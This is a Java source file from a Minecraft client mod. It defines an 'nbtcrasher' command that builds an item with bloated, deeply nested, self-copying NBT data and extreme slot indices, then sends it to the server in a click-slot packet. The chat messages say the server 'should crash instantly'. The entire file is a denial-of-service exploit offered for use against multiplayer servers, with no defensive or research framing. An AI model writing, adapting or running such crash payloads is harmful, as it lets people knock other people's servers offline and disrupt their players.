package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.paradise_client.command.Command;
import net.paradise_client.Helper;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;

public class NBTCrasherCommand extends Command {

    private static final String PREFIX = "&7[&bAtlasClient&7] ";

    public NBTCrasherCommand() {
        super("nbtcrasher", "NBT Crash Exploit");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            showUsage();
            return 1;
        }).then(literal("start")
            .executes(this::executeStart))
        .then(literal("stop")
            .executes(this::executeStop));
    }

    private int executeStart(CommandContext<CommandSource> context) {
        if (Helper.mc.getNetworkHandler() == null) {
            Helper.printChatMessage(PREFIX + "&cYou must be in-game to use this exploit.");
            return 0;
        }

        Helper.printChatMessage(PREFIX + "&aStarting NBTCrasher...");
        
        try {
            sendCrashPacket();
            Helper.printChatMessage(PREFIX + "&4Sent NBT crash packet!");
            Helper.printChatMessage(PREFIX + "&cServer should crash instantly!");
        } catch (Exception e) {
            Helper.printChatMessage(PREFIX + "&cError: " + e.getMessage());
        }
        
        return 1;
    }

    private int executeStop(CommandContext<CommandSource> context) {
        Helper.printChatMessage(PREFIX + "&cNBTCrasher stopped");
        return 1;
    }

    private void sendCrashPacket() {
        // Create crash item with malicious NBT
        ItemStack crashItem = new ItemStack(Items.WRITABLE_BOOK, 64);
        NbtCompound nbt = new NbtCompound();
        NbtCompound display = new NbtCompound();
        NbtCompound nameCompound = new NbtCompound();

        // Add multiple crash components
        for (int i = 0; i < 20; i++) {
            NbtCompound crashComponent = new NbtCompound();
            crashComponent.put("text", NbtString.of("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"));
            crashComponent.put("color", NbtString.of("dark_red"));
            crashComponent.put("bold", NbtString.of("true"));
            nameCompound.put("crash_" + i, crashComponent);
        }

        // Create deep nested structure
        NbtCompound deepStructure = new NbtCompound();
        NbtCompound current = deepStructure;
        for (int i = 0; i < 10; i++) {
            NbtCompound next = new NbtCompound();
            next.put("text", NbtString.of("DEPTH_" + i + "_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"));
            current.put("nested", next);
            current = next;
            if (i == 5) {
                current.put("circular", deepStructure.copy());
            }
        }
        nameCompound.put("deep", deepStructure);
        nameCompound.put("self", nameCompound.copy());

        display.put("Name", nameCompound);

        // Add lore with crash data
        NbtCompound loreCompound = new NbtCompound();
        for (int i = 0; i < 10; i++) {
            NbtCompound loreLine = new NbtCompound();
            loreLine.put("text", NbtString.of("LORECRASH_" + i + "_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"));
            loreCompound.put("lore_" + i, loreLine);
        }
        display.put("Lore", loreCompound);

        nbt.put("display", display);
        nbt.put("self_ref", nbt.copy());

        crashItem.setNbt(nbt);

        // Create item map with crash items
        Int2ObjectMap<ItemStack> itemMap = new Int2ObjectOpenHashMap<>();
        for (int i = 0; i < 45; i++) {
            itemMap.put(i, crashItem);
        }
        itemMap.put(Integer.MAX_VALUE, crashItem);
        itemMap.put(Integer.MIN_VALUE, crashItem);

        // Create and send the crash packet
        ClickSlotC2SPacket packet = new ClickSlotC2SPacket(
            0,                      // containerId
            0,                      // revision  
            0,                      // slot
            0,                      // button
            SlotActionType.PICKUP,  // actionType
            crashItem,              // stack
            itemMap                 // modifiedStacks
        );

        Helper.sendPacket(packet);
    }

    private void showUsage() {
        Helper.printChatMessage(PREFIX + "&4=== NBT Crasher ===");
        Helper.printChatMessage(PREFIX + "&a,nbtcrasher start &7- Send malicious NBT packet");
        Helper.printChatMessage(PREFIX + "&c,nbtcrasher stop &7- Stop crasher");
    }
}
